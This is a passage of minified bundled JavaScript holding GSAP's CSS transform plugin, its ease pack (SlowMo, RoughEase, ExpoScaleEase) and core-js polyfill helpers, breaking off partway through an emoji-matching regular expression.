        Oi = function (t, e) {
          (e.z = "0px"),
            (e.rotationY = e.rotationX = "0deg"),
            (e.force3D = 0),
            ki(t, e);
        },
        ki = function (t, e) {
          var r = e || this,
            i = r.xPercent,
            n = r.yPercent,
            s = r.x,
            o = r.y,
            a = r.z,
            l = r.rotation,
            h = r.rotationY,
            u = r.rotationX,
            c = r.skewX,
            d = r.skewY,
            p = r.scaleX,
            f = r.scaleY,
            g = r.transformPerspective,
            m = r.force3D,
            _ = r.target,
            v = r.zOrigin,
            y = "",
            D = ("auto" === m && t && 1 !== t) || !0 === m;
          if (v && ("0deg" !== u || "0deg" !== h)) {
            var x,
              b = parseFloat(h) * Vr,
              w = Math.sin(b),
              T = Math.cos(b);
            (b = parseFloat(u) * Vr),
              (x = Math.cos(b)),
              (s = Ai(_, s, w * x * -v)),
              (o = Ai(_, o, -Math.sin(b) * -v)),
              (a = Ai(_, a, T * x * -v + v));
          }
          "0px" !== g && (y += "perspective(" + g + ") "),
            (i || n) && (y += "translate(" + i + "%, " + n + "%) "),
            (D || "0px" !== s || "0px" !== o || "0px" !== a) &&
              (y +=
                "0px" !== a || D
                  ? "translate3d(" + s + ", " + o + ", " + a + ") "
                  : "translate(" + s + ", " + o + ") "),
            "0deg" !== l && (y += "rotate(" + l + ") "),
            "0deg" !== h && (y += "rotateY(" + h + ") "),
            "0deg" !== u && (y += "rotateX(" + u + ") "),
            ("0deg" === c && "0deg" === d) ||
              (y += "skew(" + c + ", " + d + ") "),
            (1 === p && 1 === f) || (y += "scale(" + p + ", " + f + ") "),
            (_.style[ni] = y || "translate(0, 0)");
        },
        Li = function (t, e) {
          var r,
            i,
            n,
            s,
            o,
            a = e || this,
            l = a.xPercent,
            h = a.yPercent,
            u = a.x,
            c = a.y,
            d = a.rotation,
            p = a.skewX,
            f = a.skewY,
            g = a.scaleX,
            m = a.scaleY,
            _ = a.target,
            v = a.xOrigin,
            y = a.yOrigin,
            D = a.xOffset,
            x = a.yOffset,
            b = a.forceCSS,
            w = parseFloat(u),
            T = parseFloat(c);
          (d = parseFloat(d)),
            (p = parseFloat(p)),
            (f = parseFloat(f)) && ((p += f = parseFloat(f)), (d += f)),
            d || p
              ? ((d *= Vr),
                (p *= Vr),
                (r = Math.cos(d) * g),
                (i = Math.sin(d) * g),
                (n = Math.sin(d - p) * -m),
                (s = Math.cos(d - p) * m),
                p &&
                  ((f *= Vr),
                  (o = Math.tan(p - f)),
                  (n *= o = Math.sqrt(1 + o * o)),
                  (s *= o),
                  f &&
                    ((o = Math.tan(f)),
                    (r *= o = Math.sqrt(1 + o * o)),
                    (i *= o))),
                (r = Dt(r)),
                (i = Dt(i)),
                (n = Dt(n)),
                (s = Dt(s)))
              : ((r = g), (s = m), (i = n = 0)),
            ((w && !~(u + "").indexOf("px")) ||
              (T && !~(c + "").indexOf("px"))) &&
              ((w = vi(_, "x", u, "px")), (T = vi(_, "y", c, "px"))),
            (v || y || D || x) &&
              ((w = Dt(w + v - (v * r + y * n) + D)),
              (T = Dt(T + y - (v * i + y * s) + x))),
            (l || h) &&
              ((o = _.getBBox()),
              (w = Dt(w + (l / 100) * o.width)),
              (T = Dt(T + (h / 100) * o.height))),
            (o =
              "matrix(" +
              r +
              "," +
              i +
              "," +
              n +
              "," +
              s +
              "," +
              w +
              "," +
              T +
              ")"),
            _.setAttribute("transform", o),
            b && (_.style[ni] = o);
        },
        Bi = function (t, e, r, i, n, s) {
          var o,
            a,
            l = j(n),
            h = parseFloat(n) * (l && ~n.indexOf("rad") ? jr : 1),
            u = s ? h * s : h - i,
            c = i + u + "deg";
          return (
            l &&
              ("short" === (o = n.split("_")[1]) &&
                (u %= 360) != u % 180 &&
                (u += u < 0 ? 360 : -360),
              "cw" === o && u < 0
                ? (u = ((u + 36e9) % 360) - 360 * ~~(u / 360))
                : "ccw" === o &&
                  u > 0 &&
                  (u = ((u - 36e9) % 360) - 360 * ~~(u / 360))),
            (t._pt = a = new ar(t._pt, e, r, i, u, Yr)),
            (a.e = c),
            (a.u = "deg"),
            t._props.push(r),
            a
          );
        },
        zi = function (t, e, r) {
          var i,
            n,
            s,
            o,
            a,
            l,
            h,
            u = _r.style,
            c = r._gsap;
          for (n in ((u.cssText =
            getComputedStyle(r).cssText + ";position:absolute;display:block;"),
          (u[ni] = e),
          pr.body.appendChild(_r),
          (i = Mi(_r, 1)),
          Ir))
            (s = c[n]) !== (o = i[n]) &&
              "perspective,force3D,transformOrigin,svgOrigin".indexOf(n) < 0 &&
              ((a = $t(s) !== (h = $t(o)) ? vi(r, n, s, h) : parseFloat(s)),
              (l = parseFloat(o)),
              (t._pt = new ar(t._pt, c, n, a, l - a, Xr)),
              (t._pt.u = h || 0),
              t._props.push(n));
          pr.body.removeChild(_r);
        };
      yt("padding,margin,Width,Radius", function (t, e) {
        var r = "Top",
          i = "Right",
          n = "Bottom",
          s = "Left",
          o = (e < 3 ? [r, i, n, s] : [r + s, r + i, n + i, n + s]).map(
            function (r) {
              return e < 2 ? t + r : "border" + r + t;
            }
          );
        wi[e > 1 ? "border" + t : t] = function (t, e, r, i, n) {
          var s, a;
          if (arguments.length < 4)
            return (
              (s = o.map(function (e) {
                return yi(t, e, r);
              })),
              5 === (a = s.join(" ")).split(s[0]).length ? s[0] : a
            );
          (s = (i + "").split(" ")),
            (a = {}),
            o.forEach(function (t, e) {
              return (a[t] = s[e] = s[e] || s[((e - 1) / 2) | 0]);
            }),
            t.init(e, a, n);
        };
      });
      var Ii,
        ji,
        Vi = {
          name: "css",
          register: ui,
          targetTest: function (t) {
            return t.style && t.nodeType;
          },
          init: function (t, e, r, i, n) {
            var s,
              o,
              a,
              l,
              h,
              u,
              c,
              d,
              p,
              f,
              g,
              m,
              _,
              v,
              y,
              D,
              x,
              b,
              w,
              T = this._props,
              S = t.style;
            for (c in (gr || ui(), e))
              if (
                "autoRound" !== c &&
                ((o = e[c]), !ct[c] || !Ue(c, e, r, i, t, n))
              )
                if (
                  ((h = typeof o),
                  (u = wi[c]),
                  "function" === h && (h = typeof (o = o.call(r, i, t, n))),
                  "string" === h && ~o.indexOf("random(") && (o = he(o)),
                  u)
                )
                  u(this, t, c, o, r) && (y = 1);
                else if ("--" === c.substr(0, 2))
                  this.add(
                    S,
                    "setProperty",
                    getComputedStyle(t).getPropertyValue(c) + "",
                    o + "",
                    i,
                    n,
                    0,
                    0,
                    c
                  );
                else if ("undefined" !== h) {
                  if (
                    ((s = yi(t, c)),
                    (l = parseFloat(s)),
                    (f =
                      "string" === h && "=" === o.charAt(1)
                        ? +(o.charAt(0) + "1")
                        : 0) && (o = o.substr(2)),
                    (a = parseFloat(o)),
                    c in qr &&
                      ("autoAlpha" === c &&
                        (1 === l &&
                          "hidden" === yi(t, "visibility") &&
                          a &&
                          (l = 0),
                        mi(
                          this,
                          S,
                          "visibility",
                          l ? "inherit" : "hidden",
                          a ? "inherit" : "hidden",
                          !a
                        )),
                      "scale" !== c &&
                        "transform" !== c &&
                        ~(c = qr[c]).indexOf(",") &&
                        (c = c.split(",")[0])),
                    (g = c in Ir))
                  )
                    if (
                      (m ||
                        ((_ = t._gsap).renderTransform || Mi(t),
                        (v = !1 !== e.smoothOrigin && _.smooth),
                        ((m = this._pt =
                          new ar(
                            this._pt,
                            S,
                            ni,
                            0,
                            1,
                            _.renderTransform,
                            _,
                            0,
                            -1
                          )).dep = 1)),
                      "scale" === c)
                    )
                      (this._pt = new ar(
                        this._pt,
                        _,
                        "scaleY",
                        _.scaleY,
                        f ? f * a : a - _.scaleY
                      )),
                        T.push("scaleY", c),
                        (c += "X");
                    else {
                      if ("transformOrigin" === c) {
                        (x = void 0),
                          (b = void 0),
                          (w = void 0),
                          (b = (x = (D = o).split(" "))[0]),
                          (w = x[1] || "50%"),
                          ("top" !== b &&
                            "bottom" !== b &&
                            "left" !== w &&
                            "right" !== w) ||
                            ((D = b), (b = w), (w = D)),
                          (x[0] = xi[b] || b),
                          (x[1] = xi[w] || w),
                          (o = x.join(" ")),
                          _.svg
                            ? Fi(t, o, 0, v, 0, this)
                            : ((p = parseFloat(o.split(" ")[2]) || 0) !==
                                _.zOrigin &&
                                mi(this, _, "zOrigin", _.zOrigin, p),
                              mi(this, S, c, Ri(s), Ri(o)));
                        continue;
                      }
                      if ("svgOrigin" === c) {
                        Fi(t, o, 1, v, 0, this);
                        continue;
                      }
                      if (c in Si) {
                        Bi(this, _, c, l, o, f);
                        continue;
                      }
                      if ("smoothOrigin" === c) {
                        mi(this, _, "smooth", _.smooth, o);
                        continue;
                      }
                      if ("force3D" === c) {
                        _[c] = o;
                        continue;
                      }
                      if ("transform" === c) {
                        zi(this, o, t);
                        continue;
                      }
                    }
                  else c in S || (c = hi(c) || c);
                  if (
                    g ||
                    ((a || 0 === a) && (l || 0 === l) && !Hr.test(o) && c in S)
                  )
                    a || (a = 0),
                      (d = (s + "").substr((l + "").length)) !==
                        (p = $t(o) || (c in M.units ? M.units[c] : d)) &&
                        (l = vi(t, c, s, p)),
                      (this._pt = new ar(
                        this._pt,
                        g ? _ : S,
                        c,
                        l,
                        f ? f * a : a - l,
                        "px" !== p || !1 === e.autoRound || g ? Xr : Kr
                      )),
                      (this._pt.u = p || 0),
                      d !== p && ((this._pt.b = s), (this._pt.r = Gr));
                  else if (c in S) Di.call(this, t, c, s, o);
                  else {
                    if (!(c in t)) {
                      nt(c, o);
                      continue;
                    }
                    this.add(t, c, t[c], o, i, n);
                  }
                  T.push(c);
                }
            y && or(this);
          },
          get: yi,
          aliases: qr,
          getSetter: function (t, e, r) {
            var i = qr[e];
            return (
              i && i.indexOf(",") < 0 && (e = i),
              e in Ir && e !== si && (t._gsap.x || yi(t, "x"))
                ? r && vr === r
                  ? "scale" === e
                    ? ei
                    : ti
                  : (vr = r || {}) && ("scale" === e ? ri : ii)
                : t.style && !U(t.style[e])
                ? $r
                : ~e.indexOf("-")
                ? Jr
                : $e(t, e)
            );
          },
          core: { _removeProperty: gi, _getMatrix: Pi },
        };
      (cr.utils.checkPrefix = hi),
        (ji = yt(
          "x,y,z,scale,scaleX,scaleY,xPercent,yPercent," +
            (Ii = "rotation,rotationX,rotationY,skewX,skewY") +
            ",transform,transformOrigin,svgOrigin,force3D,smoothOrigin,transformPerspective",
          function (t) {
            Ir[t] = 1;
          }
        )),
        yt(Ii, function (t) {
          (M.units[t] = "deg"), (Si[t] = 1);
        }),
        (qr[ji[13]] = "x,y,z,scale,scaleX,scaleY,xPercent,yPercent," + Ii),
        yt(
          "0:translateX,1:translateY,2:translateZ,8:rotate,8:rotationZ,8:rotateZ,9:rotateX,10:rotateY",
          function (t) {
            var e = t.split(":");
            qr[e[1]] = ji[e[0]];
          }
        ),
        yt(
          "x,y,z,top,right,bottom,left,width,height,fontSize,padding,margin,perspective",
          function (t) {
            M.units[t] = "px";
          }
        ),
        cr.registerPlugin(Vi);
      var Ni = cr.registerPlugin(Vi) || cr,
        Ui = Ni.core.Tween;
      (t.Back = Ar),
        (t.Bounce = kr),
        (t.CSSPlugin = Vi),
        (t.Circ = zr),
        (t.Cubic = Cr),
        (t.Elastic = Rr),
        (t.Expo = Br),
        (t.Linear = Sr),
        (t.Power0 = Dr),
        (t.Power1 = xr),
        (t.Power2 = br),
        (t.Power3 = wr),
        (t.Power4 = Tr),
        (t.Quad = Er),
        (t.Quart = Pr),
        (t.Quint = Fr),
        (t.Sine = Lr),
        (t.SteppedEase = Or),
        (t.Strong = Mr),
        (t.TimelineLite = Ie),
        (t.TimelineMax = Ie),
        (t.TweenLite = Ye),
        (t.TweenMax = Ui),
        (t.default = Ni),
        (t.gsap = Ni),
        "undefined" == typeof window || window !== t
          ? Object.defineProperty(t, "__esModule", { value: !0 })
          : delete window.default;
    })(e);
  },
  function (t, e, r) {
    (function (e) {
      var r = function (t) {
        return t && t.Math == Math && t;
      };
      t.exports =
        r("object" == typeof globalThis && globalThis) ||
        r("object" == typeof window && window) ||
        r("object" == typeof self && self) ||
        r("object" == typeof e && e) ||
        Function("return this")();
    }).call(this, r(47));
  },
  function (t, e) {
    t.exports = function (t) {
      try {
        return !!t();
      } catch (t) {
        return !0;
      }
    };
  },
  function (t, e) {
    var r = {}.hasOwnProperty;
    t.exports = function (t, e) {
      return r.call(t, e);
    };
  },
  function (t, e, r) {
    var i = r(1),
      n = r(31),
      s = r(3),
      o = r(32),
      a = r(37),
      l = r(58),
      h = n("wks"),
      u = i.Symbol,
      c = l ? u : (u && u.withoutSetter) || o;
    t.exports = function (t) {
      return (
        s(h, t) || (a && s(u, t) ? (h[t] = u[t]) : (h[t] = c("Symbol." + t))),
        h[t]
      );
    };
  },
  function (t, e) {
    t.exports = function (t) {
      return "object" == typeof t ? null !== t : "function" == typeof t;
    };
  },
  function (t, e, r) {
    !(function (t) {
      "use strict";
      var e,
        r,
        i = function () {
          return (
            e ||
            ("undefined" != typeof window &&
              (e = window.gsap) &&
              e.registerPlugin &&
              e)
          );
        },
        n = function (t, e) {
          return !!(void 0 === t ? e : t && !~(t + "").indexOf("false"));
        },
        s = function (t) {
          if ((e = t || i())) {
            r = e.registerEase;
            var n,
              s = e.parseEase(),
              o = function (t) {
                return function (e) {
                  var r = 0.5 + e / 2;
                  t.config = function (e) {
                    return t(2 * (1 - e) * e * r + e * e);
                  };
                };
              };
            for (n in s) s[n].config || o(s[n]);
            for (n in (r("slow", u), r("expoScale", c), r("rough", d), p))
              "version" !== n && e.core.globals(n, p[n]);
          }
        },
        o = function (t, e, r) {
          var i =
              (t = Math.min(1, t || 0.7)) < 1 ? (e || 0 === e ? e : 0.7) : 0,
            s = (1 - t) / 2,
            o = s + t,
            a = n(r);
          return function (t) {
            var e = t + (0.5 - t) * i;
            return t < s
              ? a
                ? 1 - (t = 1 - t / s) * t
                : e - (t = 1 - t / s) * t * t * t * e
              : t > o
              ? a
                ? 1 === t
                  ? 0
                  : 1 - (t = (t - o) / s) * t
                : e + (t - e) * (t = (t - o) / s) * t * t * t
              : a
              ? 1
              : e;
          };
        },
        a = function (t, r, i) {
          var n = Math.log(r / t),
            s = r - t;
          return (
            i && (i = e.parseEase(i)),
            function (e) {
              return (t * Math.exp(n * (i ? i(e) : e)) - t) / s;
            }
          );
        },
        l = function (t, e, r) {
          (this.t = t),
            (this.v = e),
            r &&
              ((this.next = r),
              (r.prev = this),
              (this.c = r.v - e),
              (this.gap = r.t - t));
        },
        h = function (t) {
          "object" != typeof t && (t = { points: +t || 20 });
          for (
            var r,
              i,
              s,
              o,
              a,
              h,
              u,
              c = t.taper || "none",
              d = [],
              p = 0,
              f = 0 | (+t.points || 20),
              g = f,
              m = n(t.randomize, !0),
              _ = n(t.clamp),
              v = e ? e.parseEase(t.template) : 0,
              y = 0.4 * (+t.strength || 1);
            --g > -1;

          )
            (r = m ? Math.random() : (1 / f) * g),
              (i = v ? v(r) : r),
              (s =
                "none" === c
                  ? y
                  : "out" === c
                  ? (o = 1 - r) * o * y
                  : "in" === c
                  ? r * r * y
                  : r < 0.5
                  ? (o = 2 * r) * o * 0.5 * y
                  : (o = 2 * (1 - r)) * o * 0.5 * y),
              m
                ? (i += Math.random() * s - 0.5 * s)
                : g % 2
                ? (i += 0.5 * s)
                : (i -= 0.5 * s),
              _ && (i > 1 ? (i = 1) : i < 0 && (i = 0)),
              (d[p++] = { x: r, y: i });
          for (
            d.sort(function (t, e) {
              return t.x - e.x;
            }),
              h = new l(1, 1, null),
              g = f;
            g--;

          )
            (a = d[g]), (h = new l(a.x, a.y, h));
          return (
            (u = new l(0, 0, h.t ? h : h.next)),
            function (t) {
              var e = u;
              if (t > e.t) {
                for (; e.next && t >= e.t; ) e = e.next;
                e = e.prev;
              } else for (; e.prev && t <= e.t; ) e = e.prev;
              return (u = e), e.v + ((t - e.t) / e.gap) * e.c;
            }
          );
        },
        u = o(0.7);
      (u.ease = u), (u.config = o);
      var c = a(1, 2);
      c.config = a;
      var d = h();
      (d.ease = d), (d.config = h);
      var p = { SlowMo: u, RoughEase: d, ExpoScaleEase: c };
      for (var f in p) (p[f].register = s), (p[f].version = "3.5.1");
      i() && e.registerPlugin(u),
        (t.EasePack = p),
        (t.ExpoScaleEase = c),
        (t.RoughEase = d),
        (t.SlowMo = u),
        (t.default = p),
        Object.defineProperty(t, "__esModule", { value: !0 });
    })(e);
  },
  function (t, e, r) {
    var i = r(11),
      n = r(8),
      s = r(15);
    t.exports = i
      ? function (t, e, r) {
          return n.f(t, e, s(1, r));
        }
      : function (t, e, r) {
          return (t[e] = r), t;
        };
  },
  function (t, e, r) {
    var i = r(11),
      n = r(50),
      s = r(9),
      o = r(19),
      a = Object.defineProperty;
    e.f = i
      ? a
      : function (t, e, r) {
          if ((s(t), (e = o(e, !0)), s(r), n))
            try {
              return a(t, e, r);
            } catch (t) {}
          if ("get" in r || "set" in r)
            throw TypeError("Accessors not supported");
          return "value" in r && (t[e] = r.value), t;
        };
  },
  function (t, e, r) {
    var i = r(5);
    t.exports = function (t) {
      if (!i(t)) throw TypeError(String(t) + " is not an object");
      return t;
    };
  },
  function (t, e, r) {
    var i = r(1),
      n = r(27).f,
      s = r(7),
      o = r(16),
      a = r(30),
      l = r(54),
      h = r(86);
    t.exports = function (t, e) {
      var r,
        u,
        c,
        d,
        p,
        f = t.target,
        g = t.global,
        m = t.stat;
      if ((r = g ? i : m ? i[f] || a(f, {}) : (i[f] || {}).prototype))
        for (u in e) {
          if (
            ((d = e[u]),
            (c = t.noTargetGet ? (p = n(r, u)) && p.value : r[u]),
            !h(g ? u : f + (m ? "." : "#") + u, t.forced) && void 0 !== c)
          ) {
            if (typeof d == typeof c) continue;
            l(d, c);
          }
          (t.sham || (c && c.sham)) && s(d, "sham", !0), o(r, u, d, t);
        }
    };
  },
  function (t, e, r) {
    var i = r(2);
    t.exports = !i(function () {
      return (
        7 !=
        Object.defineProperty({}, 1, {
          get: function () {
            return 7;
          },
        })[1]
      );
    });
  },
  function (t, e, r) {
    !(function (t) {
      "use strict";
      var e,
        r,
        i,
        n =
          /([\uD800-\uDBFF][\uDC00-\uDFFF](?:[\u200D\uFE0F][\uD800-\uDBFF][\uDC00-\uDFFF]){2,}|\uD83D\uDC69(?:\u200D(?:(?:\uD83D\uDC69\u200D)?\uD83D\uDC67|(?:\uD83D\uDC69\u200D)?\uD83D\uDC66)|\uD83C[\uDFFB-\uDFFF])|\uD83D\uDC69\u200D(?:\uD83D\uDC69\u200D)?\uD83D\uDC66\u200D\uD83D\uDC66|\uD83D\uDC69\u200D(?:\uD83D\uDC69\u200D)?\uD83D\uDC67\u200D(?:\uD83D[\uDC66\uDC67])|\uD83C\uDFF3\uFE0F\u200D\uD83C\uDF08|(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD37-\uDD39\uDD3D\uDD3E\uDDD6-\uDDDD])(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2640\u2642]\uFE0F|\uD83D\uDC69(?:\uD83C[\uDFFB-\uDFFF])\u200D(?:\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92])|(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC6F\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD37-\uDD39\uDD3C-\uDD3E\uDDD6-\uDDDF])\u200D[\u2640\u2642]\uFE0F|\uD83C\uDDFD\uD83C\uDDF0|\uD83C\uDDF6\uD83C\uDDE6|\uD83C\uDDF4\uD83C\uDDF2|\uD83C\uDDE9(?:\uD83C[\uDDEA\uDDEC\uDDEF\uDDF0\uDDF2\uDDF4\uDDFF])|\uD83C\uDDF7(?:\uD83C[\uDDEA\uDDF4\uDDF8\uDDFA\uDDFC])|\uD83C\uDDE8(?:\uD83C[\uDDE6\uDDE8\uDDE9\uDDEB-\uDDEE\uDDF0-\uDDF5\uDDF7\uDDFA-\uDDFF])|(?:\u26F9|\uD83C[\uDFCB\uDFCC]|\uD83D\uDD75)(?:\uFE0F\u200D[\u2640\u2642]|(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2640\u2642])\uFE0F|(?:\uD83D\uDC41\uFE0F\u200D\uD83D\uDDE8|\uD83D\uDC69(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2695\u2696\u2708]|\uD83D\uDC69\u200D[\u2695\u2696\u2708]|\uD83D\uDC68(?:(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2695\u2696\u2708]|\u200D[\u2695\u2696\u2708]))\uFE0F|\uD83C\uDDF2(?:\uD83C[\uDDE6\uDDE8-\uDDED\uDDF0-\uDDFF])|\uD83D\uDC69\u200D(?:\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D(?:\uD83D[\uDC68\uDC69])|\uD83D[\uDC68\uDC69]))|\uD83C\uDDF1(?:\uD83C[\uDDE6-\uDDE8\uDDEE\uDDF0\uDDF7-\uDDFB\uDDFE])|\uD83C\uDDEF(?:\uD83C[\uDDEA\uDDF2\uDDF4\uDDF5])|\uD83C\uDDED(?:\uD83C[\uDDF0\uDDF2\uDDF3\uDDF7\uDDF9\uDDFA])|\uD83C\uDDEB(?:\uD83C[\uDDEE-\uDDF0\uDDF2\uDDF4\uDDF7])|[#\*0-9]\uFE0F\u20E3|\uD83C\uDDE7(?:\uD83C[\uDDE6\uDDE7\uDDE9-\uDDEF\uDDF1-\uDDF4\uDDF6-\uDDF9\uDDFB\uDDFC\uDDFE\uDDFF])|\uD83C\uDDE6(?:\uD83C[\uDDE8-\uDDEC\uDDEE\uDDF1\uDDF2\uDDF4\uDDF6-\uDDFA\uDDFC\uDDFD\uDDFF])|\uD83C\uDDFF(?:\uD83C[\uDDE6\uDDF2\uDDFC])|\uD83C\uDDF5(?:\uD83C[\uDDE6\uDDEA-\uDDED\uDDF0-\uDDF3\uDDF7-\uDDF9\uDDFC\uDDFE])|\uD83C\uDDFB(?:\uD83C[\uDDE6\uDDE8\uDDEA\uDDEC\uDDEE\uDDF3\uDDFA])|\uD83C\uDDF3(?:\uD83C[\uDDE6\uDDE8\uDDEA-\uDDEC\uDDEE\uDDF1\uDDF4\uDDF5\uDDF7\uDDFA\uDDFF])|\uD83C\uDFF4\uDB40\uDC67\uDB40\uDC62(?:\uDB40\uDC77\uDB40\uDC6C\uDB40\uDC73|\uDB40\uDC73\uDB40\uDC63\uDB40\uDC74|\uDB40\uDC65\uDB40\uDC6E\uDB40\uDC67)\uDB40\uDC7F|\uD83D\uDC68(?:\u200D(?:\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D)?\uD83D\uDC68|(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC66\u200D\uD83D\uDC66|(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC67\u200D(?:\uD83D[\uDC66\uDC67])|\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92])|(?:\uD83C[\uDFFB-\uDFFF])\u200D(?:\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]))|\uD83C\uDDF8(?:\uD83C[\uDDE6-\uDDEA\uDDEC-\uDDF4\uDDF7-\uDDF9\uDDFB\uDDFD-\uDDFF])|\uD83C\uDDF0(?:\uD83C[\uDDEA\uDDEC-\uDDEE\uDDF2\uDDF3\uDDF5\uDDF7\uDDFC\uDDFE\uDDFF])|\uD83C\uDDFE(?:\uD83C[\uDDEA\uDDF9])|\uD83C\uDDEE(?:\uD83C[\uDDE8-\uDDEA\uDDF1-\uDDF4\uDDF6-\uDDF9])|\uD83C\uDDF9(?:\uD83C[\uDDE6\uDDE8\uDDE9\uDDEB-\uDDED\uDDEF-\uDDF4\uDDF7\uDDF9\uDDFB\uDDFC\uDDFF])|\uD83C\uDDEC(?:\uD83C[\uDDE6\uDDE7\uDDE9-\uDDEE\uDDF1-\uDDF3\uDDF5-\uDDFA\uDDFC\uDDFE])|\uD83C\uDDFA(?:\uD83C[\uDDE6\uDDEC\uDDF2\uDDF3\uDDF8\uDDFE\uDDFF])|\uD83C\uDDEA(?:\uD83C[\uDDE6\uDDE8\uDDEA\uDDEC\uDDED\uDDF7-\uDDFA])|\uD83C\uDDFC(?:\uD83C[\uDDEB\uDDF8])|(?:\u26F9|\uD83C[\uDFCB\uDFCC]|\uD83D\uDD75)(?:\uD83C[\uDFFB-\uDFFF])|(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD37-\uDD39\uDD3D\uDD3E\uDDD6-\uDDDD])(?:\uD83C[\uDFFB-\uDFFF])|(?:[\u261D\u270A-\u270D]|\uD83C[\uDF85\uDFC2\uDFC7]|\uD83D[\uDC42\uDC43\uDC46-\uDC50\uDC66\uDC67\uDC70\uDC72\uDC74-\uDC76\uDC78\uDC7C\uDC83\uDC85\uDCAA\uDD74\uDD7A\uDD90\uDD95\uDD96\uDE4C\uDE4F\uDEC0\uDECC]|\uD83E[\uDD18-\uDD1C\uDD1E\uDD1F\uDD30-\uDD36\uDDD1-\uDDD5])(?:\uD83C[\uDFFB-\uDFFF])|\uD83D\uDC68(?:\u200D(?:(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC67|(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC66)|\uD83C[\uDFFB-\uDFFF])|(?:[\u261D\u26F9\u270A-\u270D]|\uD83C[\uDF85\uDFC2-\uDFC4\uDFC7\uDFCA-\uDFCC]|\uD83D[\uDC42\uDC43\uDC46-\uDC50\uDC66-\uDC69\uDC6E\uDC70-\uDC78\uDC7C\uDC81-\uDC83\uDC85-\uDC87\uDCAA\uDD74\uDD75\uDD7A\uDD90\uDD95\uDD96\uDE45-\uDE47\uDE4B-\uDE4F\uDEA3\uDEB4-\uDEB6\uDEC0\uDECC]|\uD83E[\uDD18-\uDD1C\uDD1E\uDD1F\uDD26\uDD30-\uDD39\uDD3D\uDD3E\uDDD1-\uDDDD])(?:\uD83C[\uDFFB-\uDFFF])?|(?:[\u231A\u231B\u23E9-\u23EC\u23F0\u23F3\u25FD\u25FE\u2614\u2615\u2648-\u2653\u267F\u2693\u26A1\u26AA\u26AB\u26BD\u26BE\u26C4\u26C5\u26CE\u26D4\u26EA\u26F2\u26F3\u26F5\u26FA\u26FD\u2705\u270A\u270B\u2728\u274C\u274E\u2753-\u2755\u2757\u2795-\u2797\u27B0\u27BF\u2B1B\u2B1C\u2B50\u2B55]|\uD83C[\uDC04\uDCCF\uDD8E\uDD91-\uDD9A\uDDE6-\uDDFF\uDE01\uDE1A\uDE2F\uDE32-\uDE36\uDE38-\uDE3A\uDE50\uDE51\uDF00-\uDF20\uDF2D-\uDF35\uDF37-\uDF7C\uDF7E-\uDF93\uDFA0-\uDFCA\uDFCF-\uDFD3\uDFE0-\uDFF0\uDFF4\uDFF8-\uDFFF]|\uD83D[\uDC00-\uDC3E\uDC40\uDC42-\uDCFC\uDCFF-\uDD3D\uDD4B-\uDD4E\uDD50-\uDD67\uDD7A\uDD95\uDD96\uDDA4\uDDFB-\uDE4F\uDE80-\uDEC5\uDECC\uDED0-\uDED2\uDEEB\uDEEC\uDEF4-\uDEF8]|\uD83E[\uDD10-\uDD3A\uDD3C-\uDD3E\uDD40-\uDD45\uDD47-\uDD4C\uDD50-\uDD6B\uDD80-\uDD97\uDDC0\uDDD0-\uDDE6])|(?:[#\*0-9\xA9\xAE\u203C\u2049\u2122\u2139\u2194-\u2199\u21A9\u21AA\u231A\u231B\u2328\u23CF\u23E9-\u23F3\u23F8-\u23FA\u24C2\u25AA\u25AB\u25B6\u25C0\u25FB-\u25FE\u2600-\u2604\u260E\u2611\u2614\u2615\u2618\u261D\u2620\u2622\u2623\u2626\u262A\u262E\u262F\u2638-\u263A\u2640\u2642\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267B\u267F\u2692-\u2697\u2699\u269B\u269C\u26A0\u26A1\u26AA\u26AB\u26B0\u26B1\u26BD\u26BE\u26C4\u26C5\u26C8\u26CE\u26CF\u26D1\u26D3\u26D4\u26E9\u26EA\u26F0-\u26F5\u26F7-\u26FA\u26FD\u2702\u2705\u2708-\u270D\u270F\u2712\u2714\u2716\u271D\u2721\u2728\u2733\u2734\u2744\u2747\u274C\u274E\u2753-\u2755\u2757\u2763\u2764\u2795-\u2797\u27A1\u27B0\u27BF\u2934\u2935\u2B05-\u2B07\u2B1B\u2B1C\u2B50\u2B55\u3030\u303D\u3297\u3299]|\uD83C[\uDC04\uDCCF\uDD70\uDD71\uDD7E\uDD7F\uDD8E\uDD91-\uDD9A\uDDE6-\uDDFF\uDE01\uDE02\uDE1A\uDE2F\uDE32-\uDE3A\uDE50\uDE51\uDF00-\uDF21\uDF24-\uDF93\uDF96\uDF97\uDF99-\uDF9B\uDF9E-\uDFF0\uDFF3-\uDFF5